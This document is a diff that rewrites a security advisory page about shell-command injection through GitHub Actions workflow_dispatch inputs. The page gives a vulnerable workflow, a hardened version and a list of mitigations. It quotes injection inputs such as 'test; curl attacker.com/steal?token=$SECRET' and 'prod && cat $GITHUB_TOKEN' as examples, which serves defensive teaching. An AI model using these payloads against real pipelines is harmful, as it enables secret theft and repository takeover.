@@ -1,97 +1,97 @@
-# Code Injection Via Input
+# Code Injection via Input
 
-## Vulnerability Description
+## Description
 
+Workflows that accept `workflow_dispatch` inputs and interpolate them directly into shell commands give untrusted users a remote code execution primitive: an attacker can supply `foo; curl attacker` and the runner executes it with the workflow’s privileges. GitHub explicitly warns that user input must be validated before use in commands or file paths. [^gh_security]
 
-Workflow_dispatch input {input_name} is used in shell commands without proper validation.
-This creates code injection risks:
+## Vulnerable Instance
 
-- User-controlled input is used directly in shell commands
+- Workflow exposes a free-form `workflow_dispatch` input (type `string`).
+- A step calls the input inside `run: |` without quoting or validation.
+- Runner inherits write/scoped permissions, so malicious commands can exfiltrate secrets or push commits.
 
-- Attackers can inject malicious commands through workflow inputs
-
-- Injected commands run with the workflows permissions
-
-- Attackers can exfiltrate secrets, modify files, or perform unauthorized actions
-
-
-Attack scenarios:
-
-- Attacker triggers workflow_dispatch with malicious input: test; curl attacker.com/steal?token=$SECRET; #
-
-- Workflow uses input in shell command without validation
-
-- Malicious command executes, stealing secrets or compromising the system
-
-
-## Recommendation
-
-
-Validate and sanitize workflow inputs before use:
-
-
-1. Validate inputs against allowlists:
-
-- name: Validate input
-
-run: |
-
-if [[ ! \${{{{ inputs.{input_name} }}}}\ =~ ^[a-zA-Z0-9 ]+$ ]]; then
-
-echo \Invalid input\
-
-exit 1
-
-fi
-
-
-2. Sanitize inputs before use:
-
-- name: Sanitize input
-
-run: |
-
-SAFE_INPUT=$(echo \${{{{ inputs.{input_name} }}}}\ | sed s/[^a-zA-Z0-9 ]//g)
-
-# Use SAFE_INPUT instead of direct variable
-
-
-3. Use environment variables with proper quoting:
-
-- name: Use input
-
-env:
-
-INPUT_VALUE: ${{{{ inputs.{input_name} }}}}
-
-run: |
-
-echo \$INPUT_VALUE\  # Quoted to prevent injection
-
-
-4. Avoid using inputs in dangerous contexts:
-
-- Dont use in eval, exec, or command substitution
-
-- Dont use in curl/wget URLs without validation
-
-- Validate file paths if used in file operations
-
-
-5. Use input types and validation:
-
+```yaml
+name: Manual Deploy
 on:
+  workflow_dispatch:
+    inputs:
+      target_env:
+        description: "Environment name"
+        required: true
 
-workflow_dispatch:
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run deploy script
+        run: ./scripts/deploy.sh ${{ inputs.target_env }}
+```
 
-inputs:
+An attacker can trigger this workflow with `target_env: "prod && cat $GITHUB_TOKEN"` and arbitrary commands will run.
 
-{input_name}:
+## Mitigation Strategies
 
-type: choice  # Use choice type when possible
+1. **Validate inputs early**  
+   Use bash regex/allowlists or `case` statements to restrict the accepted characters or values.
+2. **Prefer enumerated choices**  
+   Convert string inputs to `type: choice` where practical so GitHub enforces the set of allowed values.
+3. **Quote and sanitize**  
+   Always quote input references (e.g., `"${{ inputs.name }}"`) and strip unsafe characters before use.
+4. **Separate logic from user input**  
+   Avoid passing inputs to `eval`, command substitution, or scripts that construct shell pipelines.
+5. **Limit workflow permissions**  
+   Set minimal `permissions` so even if injection occurs, token scope minimizes damage.
+6. **Audit dispatch triggers**  
+   Periodically review `workflow_dispatch` workflows for unsafe `run` steps or missing validation blocks.
 
-options: [option1, option2]  # Limit to specific values
+### Secure Version
 
+- Input validation runs before any sensitive command.
+- Input type is restricted to a known set of environments.
+- Deployment script receives a sanitized, quoted argument only after validation passes. [^gh_security]
 
-6. Review all uses of workflow_dispatch inputs
+```yaml
+name: Manual Deploy (Safe)
+on:
+  workflow_dispatch:
+    inputs:
+      target_env:
+        type: choice
+        options: [staging, production]
+        required: true
 
+jobs:
+  deploy:
+    permissions:
+      contents: read
+      deployments: write
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Validate environment
+        run: |
+          case "${{ inputs.target_env }}" in
+            staging|production) ;;
+            *) echo "Invalid env"; exit 1 ;;
+          esac
+      - name: Deploy
+        run: ./scripts/deploy.sh "${{ inputs.target_env }}"
+```
+
+## Impact
+
+| Dimension | Severity | Notes |
+| --- | --- | --- |
+| Likelihood | ![High](https://img.shields.io/badge/-High-orange?style=flat-square) | Manual workflows often expose unvalidated text inputs for convenience. |
+| Risk | ![Critical](https://img.shields.io/badge/-Critical-red?style=flat-square) | Injected commands inherit the workflow token, enabling repo takeovers or secret theft. |
+| Blast radius | ![Wide](https://img.shields.io/badge/-Wide-yellow?style=flat-square) | Any environment reachable by the deploy script (infra, registries, production) is exposed. |
+
+## References
+
+- GitHub Docs, “Security hardening for GitHub Actions,” https://docs.github.com/actions/security-guides/security-hardening-for-github-actions [^gh_security]
+- GitHub Docs, “Events that trigger workflows: workflow_dispatch,” https://docs.github.com/actions/using-workflows/events-that-trigger-workflows#workflow_dispatch
+
+---
+
+[^gh_security]: GitHub Docs, “Security hardening for GitHub Actions,” https://docs.github.com/actions/security-guides/security-hardening-for-github-actions
